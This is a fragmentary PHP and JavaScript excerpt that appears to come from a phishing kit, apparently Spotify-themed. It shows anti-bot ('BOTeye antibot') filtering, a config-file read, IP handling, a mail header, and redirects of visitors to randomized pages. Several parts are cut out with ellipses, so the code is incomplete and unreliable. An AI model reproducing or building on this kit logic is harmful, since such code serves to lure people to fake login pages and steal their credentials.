...
#------------------------
#For Bot
$tanitatikaram = parse_ini_file("config-5e871947bdcb487de1e1b53ddaf7cd9a9e0d4133.ini", true);
...
$HEADER .= "From: BOTeye v1.8 <antibot@mail.com>\n";
...
$dota = str_replace(".", "", $IP);
header("location:$DIR/index.php?id=$randomString");
#----------------------++
}
?>                        
<?php 
...
window.location.href = "inline.php?<?php echo $spoti;?>=<?php echo $spoti;?>-<?php echo $rand;?>";
}else {
